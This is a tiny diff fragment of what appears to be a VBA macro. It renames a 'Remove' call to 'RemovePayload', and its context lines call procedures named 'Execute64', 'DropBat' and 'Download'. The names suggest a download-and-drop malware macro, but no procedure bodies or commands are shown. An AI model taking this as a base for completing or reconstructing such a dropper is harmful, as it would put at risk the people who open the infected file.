@@ -6,7 +6,7 @@ Else
     Execute64
 End If
 DropBat
-Remove
+RemovePayload
 End Sub
 
 Public Function Download() As Variant
